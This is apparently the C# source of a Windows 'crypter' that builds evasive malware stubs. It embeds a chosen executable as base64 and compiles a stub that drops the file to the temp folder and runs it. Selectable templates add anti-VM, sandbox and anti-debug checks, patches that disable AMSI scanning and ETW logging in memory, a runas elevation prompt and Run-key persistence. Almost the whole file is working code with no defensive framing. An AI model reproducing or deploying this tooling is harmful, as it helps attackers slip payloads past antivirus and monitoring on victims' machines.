using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Crypter.Settings;

namespace Crypter.Forms
{
    public partial class FrmCrypter : Form
    {
        public FrmCrypter()
        {
            InitializeComponent();
        }

        private void FrmCrypter_Load(object sender, EventArgs e)
        {
            SettingsObject obj = Settings.Load();
            if (obj != null)
            {
                UnpackSettings(obj);
            }
            Console.WriteLine("[+] Loaded Crypter and Resources!");
        }
        
        private void FrmCrypter_FormClosing(object sender, FormClosingEventArgs e)
        {
            Settings.Save(PackSettings());
            Environment.Exit(0);
        }

        private SettingsObject PackSettings()
        {
            SettingsObject obj = new SettingsObject()
            {
                inputfile = inputfile.Text,
                antiDebug = antiDebug.Checked,
                antiVM = antiVM.Checked,
                amsiBypass = amsiBypass.Checked,
                etwBypass = etwBypass.Checked,
                obfuscation = obfuscator.Checked,
                runas = runas.Checked
            };
            return obj;
        }

        private void UnpackSettings(SettingsObject obj)
        {
            inputfile.Text = obj.inputfile;
            antiDebug.Checked = obj.antiDebug;
            antiVM.Checked = obj.antiVM;
            amsiBypass.Checked = obj.amsiBypass;
            etwBypass.Checked = obj.etwBypass;
            obfuscator.Checked = obj.obfuscation;
            runas.Checked = obj.runas;
        }

        static string antiVMTemplate()
        {
            return @"
static bool IsRunningVM()
{
    try
    {
        using (var searcher = new System.Management.ManagementObjectSearcher(""Select * from Win32_ComputerSystem""))
        {
            foreach (var item in searcher.Get())
            {
                string manufacturer = item[""Manufacturer""].ToString().ToLower();
                string model = item[""Model""].ToString().ToLower();
                
                if (manufacturer.Contains(""vmware"") || model.Contains(""virtualbox"") || model.Contains(""virtaul""))
                    return true;
            }
        }

        using (var searcher = new System.Management.ManagementObjectSearcher(""Select * from Win32_BIOS""))
        {
            foreach (var item in searcher.Get())
            {
                string bios = item[""SerialNumber""].ToString().ToLower();
                if (bios.Contains(""vmware"") || bios.Contains(""virtualbox""))
                    return true;
            }
        }
    }
    catch { }
    return false;
}

static bool IsSandboxed()
{
    try
    {
        string[] sandboxindicators = new string[]
        {
            ""SbieDll.dll"",
            ""VBoxService"",
            ""vmtoolsd"",
            ""vboxtray""
        };

        foreach (var proc in Process.GetProcesses())
        {
            if (sandboxindicators.Any(indicator => proc.ProcessName.ToLower().Contains(indicator.ToLower())))
               return true;
        }

    }
    catch { }
    return false;
}
";
        }

        static string antiDebugTemplate()
        {
            return @"
static void RunAntiDebug()
{
    if (IsManagedDebuggerAttached() || IsDebuggerAPI() || HasDebugPort())
    {
        Environment.Exit(0);
    }
}

static bool IsManagedDebuggerAttached()
{
    return Debugger.IsAttached || Debugger.IsLogging();
}

static bool IsDebuggerAPI()
{
    try
    {
        bool isDebuggerPresent = false;
        CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);

        if (IsDebuggerPresent() || isDebuggerPresent)
            return true;
    }
    catch { }

    return false;
}

static bool HasDebugPort()
{
    try
    {
        int debugPort = 0;
        int returnLength;
        int status = NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 7, out debugPort, sizeof(int), out returnLength);
        return (status == 0 && debugPort != 0);
    }
    catch { }

    return false;
}
";
        }

        static string amsiBypassTemplate()
        {
            return @"
private static IntPtr ResolveAddress(IntPtr relativeAddress, IntPtr relativeBase, string moduleName)
{
    IntPtr moduleHandle = GetModuleHandle(moduleName);
    if (moduleHandle == IntPtr.Zero)
        moduleHandle = LoadLibrary(moduleName);
    if (moduleHandle == IntPtr.Zero)
        return IntPtr.Zero;

    return (IntPtr)((long)relativeAddress - (long)relativeBase + (long)moduleHandle);
}

public static void PatchAMSI()
{
    try
    {   
        string moduleName = ""amsi.dll"";
        IntPtr patchAddress = IntPtr.Zero;

        Version osVersion = Environment.OSVersion.Version;
        bool isWin11 = (osVersion.Major >= 10 && osVersion.Build >= 22000);

        patchAddress = isWin11
            ? ResolveAddress(AmsiScanBuffer_Win11, RebaseAddress, moduleName)
            : ResolveAddress(AmsiScanBuffer_Win10, RebaseAddress, moduleName);

        if (patchAddress == IntPtr.Zero)
            return;

        byte[] patchBytes = (IntPtr.Size == 8)
            ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0x48, 0x8B, 0x04, 0x24, 0x48, 0x83, 0xC4, 0x08, 0xFF, 0xE0 }
            : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0x58, 0x83, 0xC4, 0x18, 0xFF, 0xE0 };

        uint oldProtect;
        if (VirtualProtect(patchAddress, (UIntPtr)patchBytes.Length, PAGE_EXECUTE_READWRITE, out oldProtect))
        {
            Marshal.Copy(patchBytes, 0, patchAddress, patchBytes.Length);
            VirtualProtect(patchAddress, (UIntPtr)patchBytes.Length, oldProtect, out oldProtect);
        }
    }
    catch { }
}
";
        }

        static string etwBypassTemplate()
        {
            return @"
public static void PatchETW()
{
    try
    {
        IntPtr ntdll = GetModuleHandle(""ntdll.dll"");
        IntPtr etwEventWrite = GetProcAddress(ntdll, ""EtwEventWrite"");
        uint oldProtect;
        VirtualProtect(etwEventWrite, (UIntPtr)1, PAGE_EXECUTE_READWRITE, out oldProtect);
        Marshal.WriteByte(etwEventWrite, 0xC3);
        VirtualProtect(etwEventWrite, (UIntPtr)1, oldProtect, out oldProtect);
    }
    catch { }
}
";
        }

        static string runasTemplate()
        {
            return @"
public static void EnsureRunAsAdmin()
{
    WindowsIdentity identity = WindowsIdentity.GetCurrent();
    WindowsPrincipal principal = new WindowsPrincipal(identity);

    if (!principal.IsInRole(WindowsBuiltInRole.Administrator))
    {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.UseShellExecute = true;
        startInfo.WorkingDirectory = Environment.CurrentDirectory;
        startInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;
        startInfo.Verb = ""runas"";

        try
        {
            Process.Start(startInfo);
        }
        catch { }

        Environment.Exit(0);
    }
}
";
        }

        static string StartupTemplate()
        {
            return @"
public static void AddStartup()
{
    try
    {
        string exepath = Process.GetCurrentProcess().MainModule.FileName;
        string registrykey = @""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"";
        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registrykey, true))
        {
            key.SetValue(""PUBLIC_STUB"", exepath);
        }
    }
    catch (Exception ex)
    {
    }
}";
        }

        static string PublicStubTemplate(bool useAntiVM, bool useAntiDebug, bool useAmsiBypass, bool useEtwBypass, bool useRunAs, bool useStartup)
        {
            string injectedMethods = "";
            string mainBody = "";

            if (useAntiVM)
            {
                injectedMethods += antiVMTemplate() + "\n";
                mainBody += "            if (IsRunningVM() || IsSandboxed())\n";
                mainBody += "                Environment.Exit(0);\n";
            }

            if (useAntiDebug)
            {
                injectedMethods += antiDebugTemplate() + "\n";
                mainBody += "            RunAntiDebug();\n";
            }

            if (useRunAs)
            {
                injectedMethods += runasTemplate() + "\n";
                mainBody += "            EnsureRunAsAdmin();\n";
            }

            if (useAmsiBypass)
            {
                injectedMethods += amsiBypassTemplate() + "\n";
                mainBody += "            PatchAMSI();\n";
            }

            if (useEtwBypass)
            {
                injectedMethods += etwBypassTemplate() + "\n";
                mainBody += "            PatchETW();\n";
            }

            if (useStartup)
            {
                injectedMethods += StartupTemplate() + "\n";
                mainBody += "            AddStartup();\n";
            }

            mainBody += "            string encryptedexe = \"TEMP\";\n";

            string template = $@"
using System;
using System.IO;
using System.Diagnostics;
using System.Security.Principal;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace namespace_name
{{
    class Program
    {{
        [DllImport(""kernel32.dll"")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport(""kernel32.dll"")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport(""kernel32.dll"")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport(""kernel32.dll"", SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [System.Runtime.InteropServices.DllImport(""kernel32.dll"")]
        private static extern bool IsDebuggerPresent();

        [System.Runtime.InteropServices.DllImport(""kernel32.dll"")]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [System.Runtime.InteropServices.DllImport(""ntdll.dll"", SetLastError = true)]
        private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, out int processInformation, int processInformationLength, out int returnLength);

        private const uint PAGE_EXECUTE_READWRITE = 0x40;

#if x64
        private static IntPtr AmsiScanBuffer_Win11 = (IntPtr)0x180008260;
        private static IntPtr AmsiScanBuffer_Win10 = (IntPtr)0x180003860;
        private static IntPtr RebaseAddress = (IntPtr)0x180000000;
#else
        private static IntPtr AmsiScanBuffer_Win11 = (IntPtr)0x10005D60;
        private static IntPtr AmsiScanBuffer_Win10 = (IntPtr)0x10005960;
        private static IntPtr RebaseAddress = (IntPtr)0x10000000;
#endif

{injectedMethods}
        static void Main(string[] args)
        {{
{mainBody}
        }}
    }}
}}";
            return template;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Filter = "Executable Files (*.exe)|*.exe";
                ofd.Title = "Select an Exectuable File";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    inputfile.Text = ofd.FileName;
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(inputfile.Text) || !File.Exists(inputfile.Text))
            {
                MessageBox.Show("No valid input file to read, is your exe empty or just doesn't exist?", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            byte[] exebytes = File.ReadAllBytes(inputfile.Text);
            string base64exe = Convert.ToBase64String(exebytes);
            string stub = PublicStubTemplate(
                antiVM.Checked,
                antiDebug.Checked,
                amsiBypass.Checked,
                etwBypass.Checked,
                runas.Checked,
                startup.Checked
            );
            string executepayload = @"
                    byte[] exebytes = Convert.FromBase64String(@""" + base64exe + @""");
                    string tmppath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + "".exe"");
                    File.WriteAllBytes(tmppath, exebytes);
                    Process.Start(tmppath);";
            stub = stub.Replace("string encryptedexe = \"TEMP\";", executepayload);

            var csc = new Microsoft.CSharp.CSharpCodeProvider();
            var parameters = new System.CodeDom.Compiler.CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "stub.exe"),
                CompilerOptions = "/target:winexe",
                IncludeDebugInformation = false
            };

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.ReferencedAssemblies.Add("System.Security.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");
            parameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");

            var results = csc.CompileAssemblyFromSource(parameters, stub);

            if (results.Errors.HasErrors)
            {
                string errors = string.Join("\n", results.Errors.Cast<System.CodeDom.Compiler.CompilerError>().Select(err => err.ToString()));
                MessageBox.Show("Compilation failed:\n" + errors);
                Console.WriteLine(errors);
            }
            else
            {
                MessageBox.Show("Stub built to AppData as stub.exe!", "Stub Built", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
    }
}
